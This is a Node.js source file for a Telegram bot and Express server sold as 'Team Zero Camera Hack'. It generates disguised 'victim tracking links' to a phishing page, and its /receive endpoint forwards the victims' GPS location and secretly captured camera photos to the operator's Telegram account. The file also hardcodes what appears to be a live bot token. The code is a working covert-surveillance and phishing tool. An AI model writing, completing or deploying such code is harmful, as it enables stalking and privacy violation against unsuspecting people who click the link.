const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const bodyParser = require('body-parser');
const app = express();

// --- CONFIGURATION ---
const BOT_TOKEN = "8728564332:AAEPqsHtIAT96F_QvxNSede01GGrB1PDH0E";
const ADMIN_ID = 7077890783; 
const PANEL_URL = "https://teamzero-camhack.vercel.app/"; // Aapka Vercel Frontend Link

const bot = new Telegraf(BOT_TOKEN);
app.use(bodyParser.json({ limit: '50mb' }));

// --- 1. RECEIVER (Website se Data Lena) ---
app.post('/receive', (req, res) => {
    const { id, type, data } = req.body;

    if (type === 'location') {
        const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
        bot.telegram.sendMessage(ADMIN_ID, `📍 *Target Location Found!*\n\n🆔 Track ID: ${id}\n🌍 Link: ${mapLink}`, { parse_mode: 'Markdown' });
    } 
    else if (type === 'image') {
        const base64Data = data.replace(/^data:image\/jpeg;base64,/, "");
        bot.telegram.sendPhoto(ADMIN_ID, { source: Buffer.from(base64Data, 'base64') }, { caption: `📸 *Camera Hack Success*\nVictim Photo Captured\nID: ${id}` });
    }
    res.sendStatus(200);
});

// --- 2. BOT INTERFACE ---
const mainMenu = Markup.keyboard([
    ["📸 Camera Hack"],
    ["💰 My Wallet", "🔗 Refer & Earn"],
    ["🌐 Info Website", "📞 Contact Us"]
]).resize();

bot.start((ctx) => {
    ctx.reply(`✨ *Assalamualaikum Rana Usman!* ✨\n\nTeam Zero Trace Intelligence Bot is Online.`, mainMenu);
});

bot.hears('📸 Camera Hack', (ctx) => {
    const trackId = 'TZ-' + Math.random().toString(36).substr(2, 4).toUpperCase();
    const decoy = Buffer.from("https://teamzerosimdatebase.vercel.app/").toString('base64');
    
    // Final Link for Victim
    const victimLink = `${PANEL_URL}?id=${trackId}&u=${decoy}&cr=1&lr=1&c=user`;

    ctx.reply(`🚀 *Victim Tracking Link Generated*\n\n🔗 Link: \`${victimLink}\`\n\n⚠️ Jaise hi victim click karega, photo aur location seedha yahan aayegi.`, { parse_mode: 'Markdown' });
});

// Extra Buttons Logic
bot.hears('💰 My Wallet', (ctx) => ctx.reply("⭐ *Wallet Status:* 500 Points (Premium Mode)"));
bot.hears('📞 Contact Us', (ctx) => ctx.reply("🛠 Support: @teamzerocontectbot"));

// --- 3. SERVER START ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("Team Zero Bot & Server Started!");
    bot.launch();
});
